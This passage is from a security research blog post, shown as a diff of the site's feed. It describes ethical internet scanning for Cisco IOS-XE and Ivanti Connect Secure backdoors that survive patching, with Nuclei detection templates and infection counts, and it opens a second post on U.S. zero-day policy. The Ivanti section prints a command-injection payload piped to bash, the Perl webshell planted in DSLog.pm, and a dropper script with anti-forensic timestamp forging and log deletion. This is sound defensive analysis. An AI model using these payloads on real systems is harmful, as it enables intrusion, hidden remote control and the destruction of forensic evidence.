+<p>After the Proof of Concept (POC) exploit became public on October 30th, exploitation attempts skyrocketed. Most of these attacks were opportunistic, as is common with popular POCs. A generic way of probing systems for the implant without interacting with the backdoor’s core functionality is to make a request to the uri <code class="language-plaintext highlighter-rouge">/%25</code> on the system (as shown in Listing 7). If the implant is listening, it will return an HTTP 404 response (or a decoy login page in the third version). This is what we used at DIVD to scan for compromised devices with the below template. Scanning for the <code class="language-plaintext highlighter-rouge">/webui/logoutconfirm.html</code> endpoint was not an option, as we did not want to interact with the implant’s core functionality and accidentally trigger any unintended effects.</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">id</span><span class="pi">:</span> <span class="s">cisco-ios-implant-detection-CVE-2023-20273</span>
+<span class="na">info</span><span class="pi">:</span>
+  <span class="na">name</span><span class="pi">:</span> <span class="s">Cisco IOS-XE Mass Exploitation CVE-2023-20273</span>
+  <span class="na">author</span><span class="pi">:</span> <span class="s">DIVD-NL</span>
+  <span class="na">severity</span><span class="pi">:</span> <span class="s">critical</span>
+
+<span class="na">http</span><span class="pi">:</span>
+  <span class="pi">-</span> <span class="na">method</span><span class="pi">:</span> <span class="s">POST</span>
+    <span class="na">path</span><span class="pi">:</span>
+      <span class="pi">-</span> <span class="s2">"</span><span class="s">{{BaseURL}}/%25"</span>
+
+    <span class="na">matchers</span><span class="pi">:</span>
+      <span class="pi">-</span> <span class="na">type</span><span class="pi">:</span> <span class="s">word</span>
+        <span class="na">words</span><span class="pi">:</span>
+          <span class="pi">-</span> <span class="s2">"</span><span class="s">&lt;head&gt;&lt;title&gt;404</span><span class="nv"> </span><span class="s">Not</span><span class="nv"> </span><span class="s">Found&lt;/title&gt;&lt;/head&gt;"</span>
+</code></pre></div></div>
+<p><span class="centered-text">Listing 7: Nuclei scanning template to detect BadCandy implants</span></p>
+
+<p>Additionally, after the generic attempt started to lose effectiveness, we would scan for the 18-character string and version number (indicated by <code class="language-plaintext highlighter-rouge">content = "/2010202301/"</code> in Listing 5) that would be returned upon setting the <code class="language-plaintext highlighter-rouge">logon_hash</code> parameter, as shown in Listing 8. The cat- and mouse game that resulted from actors changing the implant, forcing us to change our scanning methodology, interestingly shows a textbook attacker-defender dynamic. Again, patching the vulnerability didn’t mean the system was clean, as the number of compromised appliances skyrocketed shortly after the vulnerability was published.</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">id</span><span class="pi">:</span> <span class="s">cisco-ios-implant-detection-CVE-2023-20273-v2</span>
+
+<span class="na">info</span><span class="pi">:</span>
+  <span class="na">name</span><span class="pi">:</span> <span class="s">Cisco IOS-XE Mass Exploitation CVE-2023-20273 v2</span>
+  <span class="na">severity</span><span class="pi">:</span> <span class="s">critical</span>
+
+<span class="na">http</span><span class="pi">:</span>
+  <span class="pi">-</span> <span class="na">method</span><span class="pi">:</span> <span class="s">POST</span>
+    <span class="na">path</span><span class="pi">:</span>
+      <span class="pi">-</span> <span class="s2">"</span><span class="s">/webui/logoutconfirm.html?logon_hash=1"</span>
+
+    <span class="na">matchers</span><span class="pi">:</span>
+      <span class="pi">-</span> <span class="na">type</span><span class="pi">:</span> <span class="s">regex</span>
+        <span class="na">regex</span><span class="pi">:</span>
+          <span class="pi">-</span> <span class="s2">"</span><span class="s">.{18}"</span>
+        <span class="na">part</span><span class="pi">:</span> <span class="s">body</span>
+
+  <span class="pi">-</span> <span class="na">method</span><span class="pi">:</span> <span class="s">POST</span>
+    <span class="na">path</span><span class="pi">:</span>
+      <span class="pi">-</span> <span class="s2">"</span><span class="s">/webui/logoutconfirm.html?menu=1"</span>
+
+    <span class="na">matchers</span><span class="pi">:</span>
+      <span class="pi">-</span> <span class="na">type</span><span class="pi">:</span> <span class="s">word</span>
+        <span class="na">words</span><span class="pi">:</span>
+          <span class="pi">-</span> <span class="s2">"</span><span class="s">1010202301"</span>
+</code></pre></div></div>
+<p><span class="centered-text">Listing 8: Nuclei scanning template to detect BadCandy implants after generic approach no longer worked accurately</span></p>
+
+<h3 id="results-a-mapped-out-global-infection-flare-up">Results: a mapped-out global infection flare-up</h3>
+<p>Roughly three weeks after the vulnerability was published, on October 18, 2023, we measured a total of 72.795 backdoored devices. The United States leads the list by a considerable margin, likely due to its large enterprise router footprint and widespread exposure of the Web UI. Southeast Asia and Latin America also show significant concentrations. Compared to the distribution of the Citrix ADC investigation, the countries affected the most seem to be completely different.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="n">sorted_data</span> <span class="o">=</span> <span class="nf">dict</span><span class="p">(</span><span class="nf">sorted</span><span class="p">(</span><span class="n">countries</span><span class="p">.</span><span class="nf">items</span><span class="p">(),</span> <span class="n">key</span><span class="o">=</span><span class="k">lambda</span> <span class="n">item</span><span class="p">:</span> <span class="n">item</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">reverse</span><span class="o">=</span><span class="bp">True</span><span class="p">))</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">items</span> <span class="o">=</span> <span class="nf">list</span><span class="p">(</span><span class="n">sorted_data</span><span class="p">.</span><span class="nf">items</span><span class="p">())</span>
+<span class="p">...</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">20</span><span class="p">,</span> <span class="mi">5</span><span class="p">):</span>
+<span class="p">...</span>     <span class="n">line</span> <span class="o">=</span> <span class="n">items</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">5</span><span class="p">]</span>
+<span class="p">...</span>     <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">  </span><span class="sh">"</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">k</span><span class="si">}</span><span class="s">: </span><span class="si">{</span><span class="n">v</span><span class="si">}</span><span class="sh">"</span> <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">line</span><span class="p">))</span>
+<span class="bp">...</span>
+<span class="n">US</span><span class="p">:</span> <span class="mi">5218</span>  <span class="n">PH</span><span class="p">:</span> <span class="mi">3857</span>  <span class="n">CL</span><span class="p">:</span> <span class="mi">2901</span>  <span class="n">MX</span><span class="p">:</span> <span class="mi">2568</span>  <span class="n">IN</span><span class="p">:</span> <span class="mi">2154</span>
+<span class="n">TH</span><span class="p">:</span> <span class="mi">1862</span>  <span class="n">PE</span><span class="p">:</span> <span class="mi">1829</span>  <span class="n">BE</span><span class="p">:</span> <span class="mi">1321</span>  <span class="n">AT</span><span class="p">:</span> <span class="mi">1105</span>  <span class="n">BR</span><span class="p">:</span> <span class="mi">1073</span>
+<span class="n">CH</span><span class="p">:</span> <span class="mi">1043</span>  <span class="n">SG</span><span class="p">:</span> <span class="mi">986</span>  <span class="n">GB</span><span class="p">:</span> <span class="mi">966</span>  <span class="n">IT</span><span class="p">:</span> <span class="mi">964</span>  <span class="n">AU</span><span class="p">:</span> <span class="mi">875</span>
+<span class="n">DE</span><span class="p">:</span> <span class="mi">860</span>  <span class="n">NL</span><span class="p">:</span> <span class="mi">750</span>  <span class="n">EC</span><span class="p">:</span> <span class="mi">714</span>  <span class="n">FR</span><span class="p">:</span> <span class="mi">696</span>  <span class="n">RU</span><span class="p">:</span> <span class="mi">620</span>
+</code></pre></div></div>
+<p><span class="centered-text">Listing 9: Top 20 countries with BadCandy implants on October 18th, 2023</span></p>
+
+<p>All system owners that were compromised received a notification about the implant, steps to remediate, and advice on how to proceed. While Cisco themselves attempted to bury these numbers, collective effort from the industry brought down the infection rate and number of compromised hosts significantly over the months after.</p>
+
+<h2 id="ivanti-connect-secure---cve-2024-21893">Ivanti Connect Secure - CVE-2024-21893</h2>
+<p>A few months later, on January 31st, 2024, Ivanti released fixes to address four vulnerabilities. One of these, CVE-2024-21893, which is a Server-Side Request Forgery (SSRF) vulnerability that affected the SAML module. Researchers from Rapid7 and AssetNote released a working POC that anyone could use and within hours of its release, attacks were identified targeting this SAML vulnerability. The first to publish a report on the implants resulting from these attacks was <a href="https://www.orangecyberdefense.com/global/blog/research/ivanti-connect-secure-discover-the-dslog-backdoor">Orange Cyberdefense</a>, who dubbed it the DSLog backdoor.</p>
+
+<p>As with the previous cases, post-exploitation scanning revealed compromises that would have gone unnoticed by standard vulnerability checks.</p>
+
+<h3 id="scanning-for-the-backdoors-2">Scanning for the Backdoors</h3>
+<p>An important aspect of scanning for the DSLog backdoor is the first stage of the exploit, shown in Listing 9. The payload outputs either a set of random characters or the output of <code class="language-plaintext highlighter-rouge">uname -a</code> to a publicly accessible file (index.txt, index1.txt, index2.txt, etc.). This seemed to be reconnaissance activity (shown in Listing 10) to confirm that the exploit worked on the target device, an idea that is corroborated by Orange Cyberdefense. Interestingly, in 1cases where the attackers cleared the log files, the <code class="language-plaintext highlighter-rouge">uname -a</code> output offered a timestamp on the time of compromise, which is temporal evidence for the breach.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Base64 encoded request</span>
+https://127.0.0.1:8090/api/v1/license/keys-status/<span class="p">;</span><span class="nb">echo </span>ZWNobyAkKHVuYW1lIC1hO2lkKT4vaG9tZS93ZWJzZXJ2ZXIvaHRkb2NzL2RhbmEtbmEvaW1ncy9pbmRleDIudHh0|/usr/bin/base64 <span class="nt">-d</span> | /bin/bash<span class="p">;</span>
+
+<span class="c"># Decoded command</span>
+https://127.0.0.1:8090/api/v1/license/keys-status/<span class="p">;</span><span class="nb">echo</span> <span class="si">$(</span><span class="nb">uname</span> <span class="nt">-a</span><span class="p">;</span><span class="nb">id</span><span class="si">)</span><span class="o">&gt;</span>/home/webserver/htdocs/dana-na/imgs/index2.txt|/usr/bin/base64 <span class="nt">-d</span> | /bin/bash<span class="p">;</span>
+
+<span class="c"># Output in index2.txt</span>
+Linux localhost2 2.6.32-00032-g2005e8d-dirty <span class="c">#1 SMP Thu Jun 22 03:40:39 EDT 2023 x86_64 x86_64 x86_64 GNU/Linux uid=0(root) gid=0(root) groups=0(root)</span>
+</code></pre></div></div>
+<p><span class="centered-text">Listing 10: SSRF payload for CVE-2024-21893</span></p>
+
+<p>With the knowledge of now, the methodology and characteristics of the backdoor <a href="https://cloud.google.com/blog/topics/threat-intelligence/china-nexus-exploiting-critical-ivanti-vulnerability">closely resemble</a> the suspected China-nexus espionage actor tracked as UNC5221 (Mandiant) or UTA0178 (Volexity). At the time, IBM <a href="https://www.ibm.com/think/x-force/exploitation-of-exposed-ivanti-vulnerabilities">wrote a blogpost</a> that mentioned the involvement of UNC5221 based on other reporting, but also admitted they could not corroborate these findings with sufficient confidence. The type, way of dropping, and chosen locations of the webshell seem to be similar to the later Ivanti Connect Secure webshells attributed to UNC5221, such as the webshells related to <a href="https://cloud.google.com/blog/topics/threat-intelligence/ivanti-post-exploitation-lateral-movement">SPAWNANT</a> installer and <a href="https://cloud.google.com/blog/topics/threat-intelligence/ivanti-connect-secure-vpn-zero-day">PHASEJAM</a> dropper.</p>
+
+<div class="language-perl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">sub </span><span class="nf">Msg</span> <span class="p">{</span>
+  <span class="k">my</span> <span class="p">(</span><span class="nv">$event</span><span class="p">,</span> <span class="nv">$level</span><span class="p">,</span> <span class="nv">$data</span><span class="p">)</span> <span class="o">=</span> <span class="nv">@_</span><span class="p">;</span>
+  <span class="k">my</span> <span class="p">(</span><span class="nv">$pkg</span><span class="p">,</span> <span class="nv">$file</span><span class="p">,</span> <span class="nv">$line</span><span class="p">)</span> <span class="o">=</span> <span class="nb">caller</span><span class="p">;</span>
+  <span class="k">my</span> <span class="nv">$ua</span> <span class="o">=</span> <span class="nv">$ENV</span><span class="p">{</span><span class="nv">HTTP_USER_AGENT</span><span class="p">};</span>
+  <span class="k">my</span> <span class="nv">$req</span> <span class="o">=</span> <span class="nv">$ENV</span><span class="p">{</span><span class="nv">QUERY_STRING</span><span class="p">};</span>
+  <span class="k">my</span> <span class="nv">$qur</span> <span class="o">=</span> <span class="p">"</span><span class="s2">&lt;redacted&gt;</span><span class="p">";</span>
+  <span class="k">my</span> <span class="nv">@param</span> <span class="o">=</span> <span class="nb">split</span><span class="p">(</span><span class="sr">/&amp;/</span><span class="p">,</span> <span class="nv">$req</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="nb">index</span><span class="p">(</span><span class="nv">$ua</span><span class="p">,</span> <span class="nv">$qur</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$param</span><span class="p">[</span><span class="mi">1</span><span class="p">]){</span>
+      <span class="k">my</span> <span class="nv">@res</span> <span class="o">=</span> <span class="nb">split</span><span class="p">(</span><span class="sr">/=/</span><span class="p">,</span> <span class="nv">$param</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+      <span class="k">if</span> <span class="p">(</span><span class="nv">$res</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="ow">eq</span> <span class="p">"</span><span class="s2">cdi</span><span class="p">"){</span>  <span class="c1"># Include command in cdi parameter</span>
+        <span class="nv">$res</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=~</span> <span class="sr">s/([a-fA-F0-9][a-fA-F0-9])/chr(hex($1))/</span><span class="nv">eg</span><span class="p">;</span>
+        <span class="nv">$res</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=~</span> <span class="sr">tr/!-~/P-~!-O/</span><span class="p">;</span>
+        <span class="nb">system</span><span class="p">(</span><span class="nv">$</span><span class="p">{</span><span class="nv">res</span><span class="p">[</span><span class="mi">1</span><span class="p">]});</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="nv">$file</span> <span class="o">=</span> <span class="nb">substr</span> <span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="nb">rindex</span> <span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="p">"</span><span class="s2">/</span><span class="p">")</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>
+  <span class="c1"># Prevent C printf format codes to make it through...</span>
+  <span class="nv">$data</span> <span class="o">=~</span> <span class="sr">s/%/%%/g</span><span class="p">;</span>
+  <span class="nv">Msg_impl</span> <span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="nv">$line</span><span class="p">,</span> <span class="nv">$event</span><span class="p">,</span> <span class="nv">$level</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
+<span class="p">}</span>
+
+</code></pre></div></div>
+<p><span class="centered-text">Listing 11: Modified function in the /home/perl/DSLog.pm file</span></p>
+
+<p>Listing 11 shows the altered <code class="language-plaintext highlighter-rouge">Msg()</code> function on line 102 in the <code class="language-plaintext highlighter-rouge">/home/perl/DSLog.pm</code> file that includes the implant. DSLog.pm is normally a legitimate script that is used to log events on the Ivanti appliance. Commands can be executed through the shell by adding the (URL-encoded) command to the request with the <code class="language-plaintext highlighter-rouge">cdi</code> parameter. The added code is injected using the exploit shown in Listing 10, but this time with the base64-encoded payload shown in Listing 12. The payload checks if the device has already been infected, after which it writes the implant to the DSLog file and performs some anti-forensics.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Set paths to target files</span>
+<span class="nv">DESTFILE</span><span class="o">=</span><span class="s2">"/home/perl/DSLog.pm"</span>
+<span class="nv">CLFILE</span><span class="o">=</span><span class="s2">"/home/perl/DSLogMB.pm"</span>
+
+<span class="c"># Check if the file already contains HTTP_USER_AGENT</span>
+<span class="k">if </span><span class="nb">cat</span> <span class="s2">"</span><span class="nv">$DESTFILE</span><span class="s2">"</span> | <span class="nb">grep</span> <span class="nt">-q</span> <span class="s1">'HTTP_USER_AGENT'</span><span class="p">;</span> <span class="k">then
+    </span><span class="nb">echo</span> <span class="s1">'OK'</span>
+<span class="k">else</span>
+    <span class="c"># Inject Perl code starting at line 102</span>
+    <span class="nb">sed</span> <span class="nt">-i</span> <span class="s1">'102i\
+my $ua = $ENV{HTTP_USER_AGENT};\
+my $req = $ENV{QUERY_STRING};\
+my $qur = "&lt;redacted&gt;";\
+my @param = split(/&amp;/, $req);\
+if (index($ua, $qur) != -1) {\
+    if ($param[1]) {\
+        my @res = split(/=|,/, $param[1]);\
+        if ($res[0] eq "cdi") {\
+            $res[1] =~ s/([a-fA-F0-9][a-fA-F0-9])/chr(hex($1))/eg;\
+            $res[1] =~ tr/!-/P-~/P-~.!-O/;\
+            system($res[1]);\
+        }\
+    }\
+}'</span> <span class="s2">"</span><span class="nv">$DESTFILE</span><span class="s2">"</span>
+<span class="k">fi</span>
+
+<span class="c"># Sync timestamp of DESTFILE to match CLFILE (anti-forensics)</span>
+<span class="nb">touch</span> <span class="nt">-r</span> <span class="s2">"</span><span class="nv">$CLFILE</span><span class="s2">"</span> <span class="s2">"</span><span class="nv">$DESTFILE</span><span class="s2">"</span>
+
+<span class="c"># Clear crash dump traces</span>
+<span class="nb">rm</span> <span class="nt">-rf</span> /var/cores/<span class="k">*</span>
+
+<span class="c"># Run a Python warm restart with shellcode injection via base64 decoding</span>
+/home/venv3/bin/python3 <span class="nt">-c</span> <span class="s1">'import DSMonitor; DSMonitor.warmRestart()'</span> | /usr/bin/base64 <span class="nt">-d</span> | /bin/bash
+</code></pre></div></div>
+<p><span class="centered-text">Listing 12: Exploit payload to drop the implant</span></p>
+
+<p>Because the implant contains a unique key (SHA256 hash) that needs to be included in the User Agent to execute commands, there was no way to directly interact with it. However, the initial stage of the compromise included the creation of a publicly available file that contained predictable output. Therefore, this offered a scanning methodology to at least gain an indication that the implant had been present on the system.</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">id</span><span class="pi">:</span> <span class="s">CVE-2024-21893</span>
+
+<span class="na">info</span><span class="pi">:</span>
+  <span class="na">name</span><span class="pi">:</span> <span class="s">DSLog backdoor Ivanti Connect Secure</span>
+  <span class="na">author</span><span class="pi">:</span> <span class="s">DIVD-NL</span>
+  <span class="na">severity</span><span class="pi">:</span> <span class="s">critical</span>
+
+<span class="na">variables</span><span class="pi">:</span>
+  <span class="na">index</span><span class="pi">:</span> <span class="pi">[</span><span class="s2">"</span><span class="s">index.txt"</span><span class="pi">,</span> <span class="s2">"</span><span class="s">index1.txt"</span><span class="pi">,</span> <span class="s2">"</span><span class="s">index2.txt"</span><span class="pi">,</span> <span class="s2">"</span><span class="s">index3.txt"</span><span class="pi">,</span> <span class="s2">"</span><span class="s">index4.txt"</span><span class="pi">]</span>
+
+<span class="na">requests</span><span class="pi">:</span>
+  <span class="pi">-</span> <span class="na">method</span><span class="pi">:</span> <span class="s">GET</span>
+    <span class="na">path</span><span class="pi">:</span>
+      <span class="pi">-</span> <span class="s2">"</span><span class="s">/dana-na/imgs/"</span>
+
+    <span class="na">matchers-condition</span><span class="pi">:</span> <span class="s">and</span>
+    <span class="na">matchers</span><span class="pi">:</span>
+      <span class="pi">-</span> <span class="na">type</span><span class="pi">:</span> <span class="s">word</span>
+        <span class="na">words</span><span class="pi">:</span>
+          <span class="pi">-</span> <span class="s2">"</span><span class="s">WatchGuard"</span>
+        <span class="na">part</span><span class="pi">:</span> <span class="s">body</span>
+        <span class="na">negative</span><span class="pi">:</span> <span class="kc">true</span>
+
+      <span class="pi">-</span> <span class="na">type</span><span class="pi">:</span> <span class="s">dsl</span>
+        <span class="na">dsl</span><span class="pi">:</span>
+          <span class="pi">-</span> <span class="s2">"</span><span class="s">len(body)</span><span class="nv"> </span><span class="s">&gt;</span><span class="nv"> </span><span class="s">0</span><span class="nv"> </span><span class="s">&amp;&amp;</span><span class="nv"> </span><span class="s">status_code</span><span class="nv"> </span><span class="s">==</span><span class="nv"> </span><span class="s">200"</span>
+</code></pre></div></div>
+<p><span class="centered-text">Listing 13: Nuclei scanning template for the DSLog implant</span></p>
+
+<p>These files offered sufficient coverage to locate the DSLog backdoor in a scanning campaign. We did not have to approach the implant itself, which is always important from the ethics perspective. Instead of probing the implant directly, we scanned for signs of dropped index files using the method in Listing 13. Normally, the Ivanti Connect Secure appliances will return an HTTP 404 upon making a request to an endpoint that does not exist. Therefore, by scanning for HTTP 200 responses on the known indicators and verifying the content of the response, public systems could be scanned for this webshell. The only thing to take into account is to filter out the occasional WatchGuard WAF response.</p>
+
+<h3 id="results">Results</h3>
+<p>Two weeks after the vulnerability became public, on February 12th, 2024, we conducted a scan for the DSLog backdoor and found 50 backdoored instances in 17 countries. With such little results, it becomes interesting to look at the types of organizations that were backdoored. In this instance, most organizations that were compromised seemed to belong to either the steel, healthcare (robotics), telecommunications, or banking sector.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="n">sorted_data</span> <span class="o">=</span> <span class="nf">dict</span><span class="p">(</span><span class="nf">sorted</span><span class="p">(</span><span class="n">countries</span><span class="p">.</span><span class="nf">items</span><span class="p">(),</span> <span class="n">key</span><span class="o">=</span><span class="k">lambda</span> <span class="n">item</span><span class="p">:</span> <span class="n">item</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">reverse</span><span class="o">=</span><span class="bp">True</span><span class="p">))</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">items</span> <span class="o">=</span> <span class="nf">list</span><span class="p">(</span><span class="n">sorted_data</span><span class="p">.</span><span class="nf">items</span><span class="p">())</span>
+<span class="p">...</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">20</span><span class="p">,</span> <span class="mi">5</span><span class="p">):</span>
+<span class="p">...</span>     <span class="n">line</span> <span class="o">=</span> <span class="n">items</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">5</span><span class="p">]</span>
+<span class="p">...</span>     <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">  </span><span class="sh">"</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">k</span><span class="si">}</span><span class="s">: </span><span class="si">{</span><span class="n">v</span><span class="si">}</span><span class="sh">"</span> <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">line</span><span class="p">))</span>
+<span class="bp">...</span>
+<span class="n">US</span><span class="p">:</span> <span class="mi">18</span>  <span class="n">JP</span><span class="p">:</span> <span class="mi">6</span>  <span class="n">KR</span><span class="p">:</span> <span class="mi">4</span>  <span class="n">HK</span><span class="p">:</span> <span class="mi">3</span>  <span class="n">SG</span><span class="p">:</span> <span class="mi">2</span>
+<span class="n">CN</span><span class="p">:</span> <span class="mi">2</span>  <span class="n">IN</span><span class="p">:</span> <span class="mi">2</span>  <span class="n">DE</span><span class="p">:</span> <span class="mi">2</span>  <span class="n">ZA</span><span class="p">:</span> <span class="mi">2</span>  <span class="n">BH</span><span class="p">:</span> <span class="mi">2</span>
+<span class="n">FR</span><span class="p">:</span> <span class="mi">1</span>  <span class="n">ES</span><span class="p">:</span> <span class="mi">1</span>  <span class="n">MY</span><span class="p">:</span> <span class="mi">1</span>  <span class="n">CA</span><span class="p">:</span> <span class="mi">1</span>  <span class="n">TR</span><span class="p">:</span> <span class="mi">1</span>
+<span class="n">NL</span><span class="p">:</span> <span class="mi">1</span>  <span class="n">IT</span><span class="p">:</span> <span class="mi">1</span>
+</code></pre></div></div>
+<p><span class="centered-text">Listing 14: Countries with DSLog implants on February 12th, 2024.</span></p>
+
+<p>After conducting a notification campaign and sharing the information through the appropriate channels, the implants were largely taken down. On April 4th, 2024, there were eight remaining implants. These implants are active to this day.</p>
+
+<h1 id="conclusion-when-fixing-isnt-enough">Conclusion: when fixing isn’t enough</h1>
+<p>Patching is a vital part of vulnerability management, but as the case studies in this blog post show, it is no longer sufficient on its own. Persistent backdoors can survive patch windows, quietly operating long after the initial exploit has been closed. If defenders stop looking once the CVE is fixed, they risk missing the real threat: compromise that has already taken root.</p>
+
+<p>Ethical, public-interest scanning helps fill this gap. By focusing on behavioral residues and side channels, we can responsibly detect implants without triggering them and incorporate this into our scanning routines. As vulnerability researchers and incident responders, our responsibility should extend beyond identifying vulnerabilities alone. Finding these implants using responsible methods is part of a broader mission to protect the public interest and support those who may not even realize they are at risk.</p>
+
+<p>This is a reminder that vulnerability response must move beyond the binary of “patched or not” and instead ask the harder question: was the adversary already inside? Until vendors and defenders treat post-patch compromise as a first-class threat model, this work will remain essential—and at times, the only line of defense. Patching closes the door, but unless we check the locks, the intruder may still be inside.</p>]]></content><author><name>Max van der Horst</name><email>mhvanderhorst@tudelft.nl</email></author><category term="Observations on Threat Intelligence" /><summary type="html"><![CDATA[Even after patching, many edge devices remain compromised. This post explores how to ethically scan for backdoors left behind.]]></summary></entry><entry><title type="html">Ready, Retain, Fire? The Quiet Fallout of U.S. Offensive Cyber Policy</title><link href="http://localhost:4000/2025/05/30/us-cyber-policy-zero-day-retention.html" rel="alternate" type="text/html" title="Ready, Retain, Fire? The Quiet Fallout of U.S. Offensive Cyber Policy" /><published>2025-05-30T00:00:00+02:00</published><updated>2025-05-30T00:00:00+02:00</updated><id>http://localhost:4000/2025/05/30/us-cyber-policy-zero-day-retention</id><content type="html" xml:base="http://localhost:4000/2025/05/30/us-cyber-policy-zero-day-retention.html"><![CDATA[<p>Being a CNA administrator means having access to something most people never see: zero-day vulnerabilities. That access comes with responsibility, but also perspective. It’s made me think about how other actors, especially governments, handle this kind of knowledge, and what it means when one side holds a stockpile of vulnerabilities capable of large-scale surveillance or disruption. The U.S. military even <a href="https://cyber.army.mil/News/Article/1325442/stockpiling-zero-day-exploits-the-next-international-weapons-taboo/">considered</a> classifying zero-days as weapons subject to export controls.</p>
 
 <p>I was encouraged to see that some governments have public procedures designed to manage this power transparently. But lately, it feels like that transparency is under pressure.</p>
 
@@ -12,7 +465,7 @@
   <figcaption>Figure 1: The VEP Flowchart,<br /> taken from trumpwhitehouse.archives.gov</figcaption>
 </figure>
 
-<p>Today, a similar pattern seems to be emerging in the digital realm. As the Trump administration returned in 2025, its cybersecurity strategy is shifting from structured deterrence to a more aggressive, <a href="https://therecord.media/trump-administration-change-the-script-on-offensive-hacking">offense-first approach</a>, aligning with Trump’s <em>Peace Through Strength</em> doctrine. This posture <a href="https://www.iiss.org/cyber-power-matrix/anticipating-trumps-influence-on-us-cyber-command/">builds on the foundation laid by National Security Presidential Memoranda 13 (NSPM-13)</a> in 2018, which loosened interagency controls over offensive cyber operations.</p>
+<p>Today, a similar pattern seems to be emerging in the digital realm. As the Trump administration returned in 2025, its cybersecurity strategy is shifting from structured deterrence to a more aggressive, <a href="https://therecord.media/trump-administration-change-the-script-on-offensive-hacking">offense-first approach</a>, aligning with Trump’s <em>Peace Through Strength</em> doctrine. This posture builds on the foundation laid by <a href="https://www.iiss.org/cyber-power-matrix/anticipating-trumps-influence-on-us-cyber-command/">National Security Presidential Memoranda 13 (NSPM-13)</a> in 2018, which loosened interagency controls over offensive cyber operations.</p>
 
 <p>One important, but seemingly overlooked, mechanism to the U.S. offensive cyberpower is the <a href="https://trumpwhitehouse.archives.gov/sites/whitehouse.gov/files/images/External%20-%20Unclassified%20VEP%20Charter%20FINAL.PDF">Vulnerabilities Equities Process (VEP)</a>, which is the Government Disclosure Decision Process (GDDP) used to decide whether to disclose or retain newly discovered zero-day vulnerabilities. While the VEP itself has not formally changed under Trump’s current or previous administrations, it involves significant discretion, particularly in assessing whether disclosure would harm national security. Within a policy environment that is increasingly shaped by offense, there is a growing risk that this discretion may increasingly tilt toward retention.</p>
 
